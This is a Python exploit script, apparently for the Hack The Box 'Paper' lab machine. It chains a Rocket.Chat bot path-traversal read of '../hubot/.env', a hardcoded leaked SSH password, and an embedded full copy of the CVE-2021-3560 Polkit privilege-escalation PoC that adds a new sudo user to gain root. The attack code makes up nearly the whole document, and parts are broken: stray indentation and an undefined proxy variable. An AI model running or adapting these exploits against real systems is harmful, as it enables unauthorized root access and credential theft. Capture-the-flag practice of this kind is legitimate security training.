# Prerequisites:
############## hosts file #####################
# 10.10.11.143 office.paper
# 10.10.11.143 chat.office.paper

import requests
import json
import hashlib
import time
from paramiko import SSHClient, AutoAddPolicy
import base64


# proxy = {"http": "http://127.0.0.1:8080"}
# # CVE-2019-17671 viewing unauthenticated posts
# # https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/
 username = "bakaro15"
 password = "123"
 #sha256
 hashed_password = hashlib.sha256(password.encode('utf-8')).hexdigest()
 session = requests.session()
 req = session.get('http://office.paper/?static=1')
 # register rocketchat account 
 reg_url = "http://chat.office.paper/api/v1/method.callAnon/registerUser"
 data = {"message":"{\"msg\":\"method\",\"method\":\"registerUser\",\"params\":[{\"name\":\"%s\",\"email\":\"%s@gmail.com\",\"pass\":\"%s\",\"confirm-pass\":\"%s\",\"secretURL\":\"8qozr226AhkCHZdyY\"}],\"id\":\"5\"}"%(username,username,password,password)}
 req = session.post(reg_url, json=data)

 res = json.loads(req.text)["message"]
 msg = json.loads(res)
 # check if have result in res
 if "result" in msg.keys():
     print("[+] Register success")
 else:
     print("[-] Register failed")
     exit(0)
# # login 
 login_url = "http://chat.office.paper/api/v1/method.callAnon/login"
 data = {"message":"{\"msg\":\"method\",\"method\":\"login\",\"params\":[{\"user\":{\"email\":\"%s@gmail.com\"},\"password\":{\"digest\":\"%s\",\"algorithm\":\"sha-256\"}}],\"id\":\"5\"}"%(username,hashed_password)}
 req = session.post(login_url, json=data)
 res = json.loads(req.text)["message"]
 data = json.loads(res)
 # check if have result in res
 if "result" in data.keys():
     print("[+] Login success")
     id = data["result"]["id"]
     token = data["result"]["token"]
     print ("[+] id: %s"%id)
     print ("[+] token: %s"%token)
 else:
     print("[-] Login failed")
     exit(0)
 cookie = {"rc_uid":id, "rc_token":token}
 header = {"X-Auth-Token":token, "X-User-Id":id}
 # set username
 setUsr_url = "http://chat.office.paper/api/v1/method.call/setUsername"
 data = {"message":"{\"msg\":\"method\",\"method\":\"setUsername\",\"params\":[\"%s\"],\"id\":\"5\"}"%(username)}
 req = session.post(setUsr_url, json=data, cookies=cookie, headers=header)
 rep = json.loads(req.text)["message"]
 data = json.loads(rep)
 # check if have success in res
 if "result" in data.keys():
     print("[+] Set username success")
 else:
     print("[-] Set username failed")
# # Create direct room with recyclops
 info_url = "http://chat.office.paper/api/v1/method.call/createDirectMessage"
 data = {"message":"{\"msg\":\"method\",\"method\":\"createDirectMessage\",\"params\":[\"recyclops\"],\"id\":\"36\"}"}
 req = session.post(info_url, json=data, cookies=cookie, headers=header)
# rep = json.loads(req.text)["message"]
 res = json.loads(rep)
 room_id = res["result"]["rid"]
# # send message to recyclops
 msg_url = "http://chat.office.paper/api/v1/method.call/sendMessage"
 msg = "recyclops file ../hubot/.env"
 # msg = "help"
 data = {"message":"{\"msg\":\"method\",\"method\":\"sendMessage\",\"params\":[{\"rid\":\"%s\",\"msg\":\"%s\"}],\"id\":\"36\"}"%(room_id, msg)}
 req = session.post(msg_url, json=data, cookies=cookie, headers=header)

 # get response
 timestamp = int(time.time())-60
 rs_url = "http://chat.office.paper/api/v1/method.call/rocketchatSearch.search"
 data = {"message":"{\"msg\":\"method\",\"method\":\"rocketchatSearch.search\",\"params\":[\"/ROCKETCHAT_PASSWORD=/\",{\"rid\":\"%s\",\"uid\":\"%s\"},{\"searchAll\":false}],\"id\":\"40\"}"%(room_id, id)}
 req = session.post(rs_url, json=data, cookies=cookie, headers=header, proxies=proxy)
 rep = json.loads(req.text)["message"]
 res = json.loads(rep)

# ssh to dwight with password Queenofblad3s!23
host = "10.10.11.143"
username = "dwight"
password = "Queenofblad3s!23"

client = SSHClient()
client.load_system_host_keys()
client.connect(host, username=username, password=password)

# CVE-2021-3560 Polkit Privilege Esclation
# https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation
POC = b'''#!/bin/bash

$USR
$PASS
$TIME
$FORCE

RED='\\033[0;31m'
GREEN='\\033[0;32m'
BLUE='\\033[0;34m'
NC='\\033[0m' # No Color
# Argparse
function usage(){
    echo "CVE-2021-3560 Polkit v0.105-26 Linux Privilege Escalation PoC by SecNigma"
    echo ""
    echo "Original research by Kevin Backhouse"
    echo "https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/#vulnerability"
    echo ""
    echo "USAGE:"
    echo "./poc.sh"
    echo "Optional Arguments:"
    echo -e "\\t-h --help"
    echo -e "\\t-u=Enter custom username to insert (OPTIONAL)"
    echo -e "\\t-p=Enter custom password to insert (OPTIONAL)"
    echo -e "\\t-f=y, To skip vulnerability check and force exploitation. (OPTIONAL)"
    echo -e "\\t-t=Enter custom sleep time, instead of automatic detection (OPTIONAL)"
    echo -e "\\tFormat to enter time: '-t=.004' or '-t=0.004' if you want to set sleep time as 0.004ms "
    echo -e "Note:"
    echo -e "Equal to symbol (=) after specifying an option is mandatory."
    echo -e "If you don't specify the options, then the script will automatically detect the possible time and"
    echo -e "will try to insert a new user using that time."
    echo -e "Default credentials are 'secnigma:secnigmaftw'"
    echo -e "If the exploit ran successfully, then you can login using 'su - secnigma'"
    echo -e "and you can spawn a bash shell as root using 'sudo bash'"
    printf "${RED}IMPORTANT: THIS IS A TIMING BASED ATTACK. MULTIPLE TRIES ARE USUALLY REQUIRED!!${NC}\\\n"
    echo -e ""
}


while [ "$1" != "" ]; do
    PARAM=`echo $1 | awk -F= '{print $1}'`
    VALUE=`echo $1 | awk -F= '{print $2}'`
    case $PARAM in
        -h | --help)
            usage
            exit
            ;;
        -u)
            USR=$VALUE
            ;;
        -p)
            PASS=$VALUE
            ;;
        -t)
            TIME=$VALUE
            ;;
        -f)
            FORCE=$VALUE
            ;;
        *)
            echo "ERROR: unknown parameter \\"$PARAM\\""
            usage
            exit 1
            ;;
    esac
    shift
done





if  [[ $USR ]];then
	username=$(echo $USR)
else
	username="secnigma"
fi
printf "\\n"
printf "${BLUE}[!]${NC} Username set as : "$username"\\n"
if  [[ $PASS ]];then
	password=$(echo $PASS)
else

	password="secnigmaftw"
fi
# printf "${BLUE}[!]${NC} Password set as: "$password"\\n"

if  [[ $TIME ]];then
	printf "${BLUE}[!]${NC} Timing set to : "$TIME"\\n"
else

	printf "${BLUE}[!]${NC} No Custom Timing specified.\\n"
	printf "${BLUE}[!]${NC} Timing will be detected Automatically\\n"
fi

if  [[ $FORCE ]];then
	printf "${BLUE}[!]${NC} Force flag '-f=y' specified.\\n"
	printf "${BLUE}[!]${NC} Vulnerability checking is DISABLED!\\n"
else

	printf "${BLUE}[!]${NC} Force flag not set.\\n"
	printf "${BLUE}[!]${NC} Vulnerability checking is ENABLED!\\n"
fi
	

t=""
timing_int=""
uid=""


function check_dist(){
	dist=$(cat /etc/os-release|grep ^ID= | cut -d = -f2 |grep -i 'centos\|rhel\|fedora\|ubuntu\|debian')
	echo $dist

}




function check_installed(){
	name1=$(echo $1)
	d1=$(echo $2)
	if [[  $(echo $d1 | grep -i 'debian\|ubuntu' ) ]]; then
		out=$(dpkg -l  | grep -i $name1|grep -i "query and manipulate user account information\|utilities to configure the GNOME desktop")
		echo $out
	else
		if [[ $(echo $d1 | grep -i 'centos\|rhel\|fedora' ) ]]; then
			out=$(rpm -qa  | grep -i $name1|grep -i "gnome-control-center\|accountsservice")
			echo $out
		fi
	fi
}

function check_polkit(){
	d=$(echo $1)
	if [[ $(echo $d|grep -i 'debian\|ubuntu') ]]; then
		out=$(dpkg -l | grep -i polkit|grep -i "0.105-26")
	else
		if [[ $(echo $d|grep -i 'centos\|rhel\|fedora') ]];then
			out=$(rpm -qa | grep -i polkit|grep -i '0.11[3-9]')
		fi
	fi
	echo $out
}

function float_to_int(){ 
	floating=$(echo $1)
	temp_val=$(echo ${floating:2:$((${#floating}))}) # Remove point
	echo "`expr $temp_val / 1`"
}

function inc_float(){
	floating=$(echo $1)
	int_val=$(float_to_int $floating)
	val=$(echo $floating | sed -e 's/'`echo $int_val`'/'`expr $int_val + 1`'/g')
	echo $val
}

function dec_float(){
	floating=$(echo $1)
	int_val=$(float_to_int $floating)
	val=$(echo $floating | sed -e 's/'`echo $int_val`'/'`expr $int_val - 1`'/g')
	echo $val
}

function fetch_timing(){
exec 3>&1 4>&2 # Extra file descriptors to catch error
out=$( { time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:`echo $username` string:"`echo $username`" int32:1 2>&1 >/dev/null 2>&4 1>&3; } 2>&1 )
tmp=$(echo $out |grep -i "real"|awk -F '.' '{print $2}')
tmp_timing=$(echo ${tmp:0:$((${#tmp}-10))})
exec 3>&- 4>&- # release the extra file descriptors
echo $tmp_timing  
}
    
function calculate_timing(){ 
tmp_timing=$(echo $1)
size_tmp_timing=(echo ${#tmp_timing})

t=$(awk "BEGIN {print `echo $tmp_timing/2`}")
echo $t
exit 
size_t=$(echo ${#t})
if [[ "size_t" -gt "size_tmp_timing" ]] ; then
	t=${t%?}
else
	if [[ "size_t" -lt "size_tmp_timing" ]] ; then
		t=$(awk "BEGIN {print `echo $tmp_timing/2`}") 
	fi
fi
echo $t
}



function insert_user(){
	# Time required to finish the whole dbus-send request
	time_fetched=$(fetch_timing) 
	
	# Time to sleep
	timing=$(calculate_timing `echo "0."$time_fetched`)
	
	temp_count=$(inc_float `echo $timing`)
	count=$(float_to_int $temp_count)
	
	if [[ $TIME ]]; then
		t=""
		t=$(echo $TIME)
	else
		t=""
		t=$(echo $timing)
	fi
	if [[ $(id `echo $username` 2>/dev/null) ]]; then
		uid=$(id `echo $username`|cut -d = -f2|cut -d \( -f1)
		echo $uid","$t 	
	else

	loop_count=20
	for i in $(seq 1  $loop_count|sort -r)
	do
		if [[ $(id `echo $username` 2>/dev/null) ]];
		then
		       uid=$(id `echo $username`|cut -d = -f2|cut -d \( -f1)
			echo $uid","$t
		else
			dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:`echo $username` string:"`echo $username`" int32:1 2>/dev/null & sleep `echo $t`s 2>/dev/null; kill $! 2>/dev/null 
		fi
	

	done
fi

}



function insert_pass(){
	ti=$(echo $1)
	u_id=$(echo $2)
	hash1=$(openssl passwd -5 `echo -n $password`)
	temp_count=$(inc_float `echo $ti`)
	count=$(float_to_int $temp_count)
	time=$(echo $ti)
	loop_count=20
	for i in $(seq 1 $loop_count|sort -r)
	do
		dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User`echo $u_id` org.freedesktop.Accounts.User.SetPassword string:`echo -n $hash1` string:GoldenEye 2>/dev/null & sleep `echo $ti`s 2>/dev/null; kill $! 2>/dev/null
done
return 1

}

function exploit(){
			printf "${BLUE}[!]${NC} Starting exploit...\\n"
			printf "${BLUE}[!]${NC} Inserting Username `echo $username`...\\n"

			ret=$(insert_user)
			t=$(echo $ret|cut -d , -f2)
			uid=$(echo $ret|cut -d , -f1)

			if [[ $(id `echo $username` |grep -i `echo $username`)  ]]; then
				printf "${GREEN}[+]${NC} Inserted Username `echo $username`  with UID `echo $uid`!\\n"
				printf "${BLUE}[!]${NC} Inserting password hash..."
				echo $timing
				ret=$(insert_pass $(echo $t) $(echo $uid))
				if [[ "$ret" -ne "1" ]]; then
					printf "${BLUE}[!]${NC} It looks like the password insertion was succesful!\\n"
					printf "${BLUE}[!]${NC} Try to login as the injected user using su - `echo $username`\\n"
					printf "${BLUE}[!]${NC} When prompted for password, enter your password \\n"
					printf "${BLUE}[!]${NC} If the username is inserted, but the login fails; try running the exploit again.\\n"
					printf "${BLUE}[!]${NC} If the login was succesful,simply enter 'sudo bash' and drop into a root shell!\\n"
				else
					printf "${BLUE}[!]${NC} It seems like the password injection FAILED!\\n"
					printf "${BLUE}[!]${NC} Aborting Execution!\\n"
					printf "${BLUE}[!]${NC} Usually multiple attempts are required to get the timing right. Try running the exploit again.\\n"
					printf "${BLUE}[!]${NC} If the exploit doesn't work after several tries, then you may have to exploit this manually.\\n"
					
				fi
					
					
			else
				printf "${RED}[x]${NC} Insertion of Username failed!\\n"
				printf "${BLUE}[!]${NC} Aborting Execution!\\n"
				printf "${BLUE}[!]${NC} Usually multiple attempts are required to get the timing right. Try running the exploit again.\\n"
				printf "${BLUE}[!]${NC} If the exploit doesn't work after several tries, then you may have to exploit this manually.\\n"
			fi 

}

if [[ "$FORCE" == "y" ]]; then 
	exploit

else
	printf "${BLUE}[!]${NC} Starting Vulnerability Checks...\\n"
	printf "${BLUE}[!]${NC} Checking distribution...\\n"
	dist=$(check_dist)
	printf "${BLUE}[!]${NC} Detected Linux distribution as `echo $dist`\\n"

	printf "${BLUE}[!]${NC} Checking if Accountsservice and Gnome-Control-Center is installed\\n"
	ac_service=$(check_installed $(echo "accountsservice") $dist)
	gc_center=$(check_installed $(echo "gnome-control-center") $dist)


	if [[ $ac_service && $gc_center ]]
	then
		printf "${GREEN}[+]${NC} Accounts service and Gnome-Control-Center Installation Found!!\\n"
		printf "${BLUE}[!]${NC} Checking if polkit version is vulnerable\\n"
		polkit=$(check_polkit $(echo $dist))
		if [[ $polkit ]]
		then
			printf "${GREEN}[+]${NC} Polkit version appears to be vulnerable!!\\n"
			exploit
		else
			printf "${RED}[x]${NC} ERROR: Polkit version does not appears to be vulnerable!!\\n"
			printf "${BLUE}[!]${NC}  Aborting Execution!"
			printf "${BLUE}[!]${NC} You might want to use the '-f=y' flag to force exploit\\n"
		fi


		
	else
		printf "${RED}[x]${NC} ERROR: Accounts service and Gnome-Control-Center NOT found!!\\n"
		printf "${BLUE}[!]${NC}  Aborting Execution!\\n"
	fi
fi'''

stdin, stdout, stderr = client.exec_command('cat user.txt')
print("User: %s"%stdout.read().decode())
stdin, stdout, stderr = client.exec_command('echo \'%s\' | base64 -d > poc.sh' % (base64.b64encode(POC).decode()))

stdin, stdout, stderr = client.exec_command('chmod +x poc.sh')

login = False
while not login :
    stdin, stdout, stderr = client.exec_command('./poc.sh -u=clownking -p=1223')
    stdin, stdout, stderr = client.exec_command('echo 1223|su - clownking')
    if "Password" in stderr.read().decode():
        login=True

stdin.close()
stdout.close()
stderr.close()
client.close()

# print("Pwn Successful")

username = "clownking"
password = "1223"

client = SSHClient()
client.load_system_host_keys()
client.connect(host, username=username, password=password)
        
stdin, stdout, stderr = client.exec_command('echo 1223 | sudo -S cat /root/root.txt')
print("Root:%s"%stdout.read().decode())

